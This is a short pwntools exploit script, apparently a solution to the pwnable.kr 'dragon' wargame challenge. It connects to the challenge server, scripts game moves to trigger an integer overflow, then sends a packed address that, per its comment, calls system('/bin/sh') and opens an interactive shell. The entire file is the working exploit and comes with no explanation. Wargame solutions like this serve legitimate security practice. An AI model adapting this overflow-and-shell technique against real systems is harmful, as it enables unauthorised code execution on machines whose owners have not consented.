from pwn import *

def change_dragon():    # Fight with Mama Dragon
        p.sendlineafter('[ 2 ] Knight', '1')
        p.sendlineafter('Invincible.', '2')
        p.sendlineafter('Invincible.', '2')
        p.sendlineafter('[ 2 ] Knight', '1')

def do_integer_overflow():
        skills = ['3', '3', '2']
        for skill in skills:
                p.sendlineafter('Invincible.', skill)

if __name__ == '__main__':
        p = remote('pwnable.kr', 9004)

        change_dragon()

        for i in range(4):
                do_integer_overflow()

        # call system('/bin/sh')
        p.sendlineafter('The World Will Remember You As:\n', p32(0x08048dbf))
        p.recvuntil('Called:\n')
        p.interactive()
